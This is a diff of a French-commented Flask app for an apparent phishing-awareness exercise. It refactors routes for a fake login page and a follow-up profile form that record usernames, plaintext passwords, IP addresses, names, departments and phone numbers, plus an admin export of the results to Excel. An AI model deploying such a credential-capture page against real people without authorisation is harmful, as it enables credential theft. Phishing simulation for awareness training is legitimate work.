@@ -18,44 +18,47 @@ logs_db = []
 # 1. ROUTES UTILISATEURS (CYBER-PIÈGE)
 # ==========================================
 
-# Page d'accueil (Affiche le formulaire de connexion)
+# Étape 1 : Affichage de la page de connexion
 @app.route('/')
 def index():
     return render_template('login.html')
 
-# Traitement du formulaire de connexion
-@app.route('/submit-login', methods=['POST'])
+# Étape 1 bis : Traitement du formulaire de connexion
+@app.route('/submit-login', methods=['GET', 'POST'])
 def submit_login():
-    username = request.form.get('username') or request.form.get('email')
-    password = request.form.get('password')
-    
-    # Enregistrement des identifiants interceptés
-    entry = {
-        'id': len(logs_db) + 1,
-        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-        'username': username,
-        'password': password,
-        'ip': request.remote_addr,
-        'fullname': '',
-        'department': '',
-        'phone': ''
-    }
-    logs_db.append(entry)
-    session['user_id'] = entry['id']
-    
-    # Redirection vers la seconde étape (profil)
+    if request.method == 'POST':
+        username = request.form.get('username') or request.form.get('email')
+        password = request.form.get('password')
+        
+        entry = {
+            'id': len(logs_db) + 1,
+            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+            'username': username,
+            'password': password,
+            'ip': request.remote_addr,
+            'fullname': '',
+            'department': '',
+            'phone': ''
+        }
+        logs_db.append(entry)
+        session['user_id'] = entry['id']
+        
     return redirect(url_for('profile'))
 
-# Formulaire de complément de profil
-@app.route('/profile', methods=['GET', 'POST'])
+# Étape 2 : Affichage du formulaire de profil
+@app.route('/profile')
 def profile():
-    user_id = session.get('user_id')
+    return render_template('profile.html')
+
+# Étape 2 bis : Traitement du formulaire de profil (Règle l'erreur 404 sur /submit-profile)
+@app.route('/submit-profile', methods=['GET', 'POST'])
+def submit_profile():
     if request.method == 'POST':
+        user_id = session.get('user_id')
         fullname = request.form.get('fullname')
         department = request.form.get('department')
         phone = request.form.get('phone')
         
-        # Mise à jour des informations personnelles
         if user_id:
             for log in logs_db:
                 if log['id'] == user_id:
@@ -63,18 +66,17 @@ def profile():
                     log['department'] = department
                     log['phone'] = phone
                     break
-        return redirect(url_for('success'))
-        
-    return render_template('profile.html')
+                    
+    return redirect(url_for('success'))
 
-# Page de sensibilisation finale
+# Étape 3 : Page de sensibilisation finale
 @app.route('/success')
 def success():
     return render_template('success.html')
 
 
 # ==========================================
-# 2. ROUTES ADMINISTRATION (SÉCURISÉES)
+# 2. ROUTES ADMINISTRATION (PROTÉGÉES)
 # ==========================================
 
 # Page de connexion administration
@@ -97,7 +99,7 @@ def admin_logout():
     flash('Vous avez été déconnecté.', 'info')
     return redirect(url_for('admin_login'))
 
-# Tableau de bord admin
+# Tableau de bord admin (Redirige obligatoirement vers login si non connecté)
 @app.route('/admin')
 def admin_dashboard():
     if not session.get('is_admin'):
@@ -113,7 +115,7 @@ def admin_clear():
     flash('Toutes les données ont été effacées.', 'info')
     return redirect(url_for('admin_dashboard'))
 
-# Export des données vers un fichier Excel avec graphique
+# Export des données vers un fichier Excel
 @app.route('/admin/export-excel')
 def export_excel():
     if not session.get('is_admin'):
@@ -121,7 +123,6 @@ def export_excel():
 
     wb = openpyxl.Workbook()
     
-    # Feuille 1 : Identifiants
     ws_data = wb.active
     ws_data.title = "Identifiants"
     ws_data.append(["ID", "Date/Heure", "Nom d'utilisateur", "Mot de passe", "IP", "Nom complet", "Département", "Téléphone"])
@@ -135,7 +136,6 @@ def export_excel():
         dept = log['department'] or "Non renseigné"
         dept_counts[dept] = dept_counts.get(dept, 0) + 1
 
-    # Feuille 2 : Statistiques par département
     ws_stats = wb.create_sheet(title="Statistiques")
     ws_stats.append(["Département", "Nombre de piégés"])
     for dept, count in dept_counts.items():
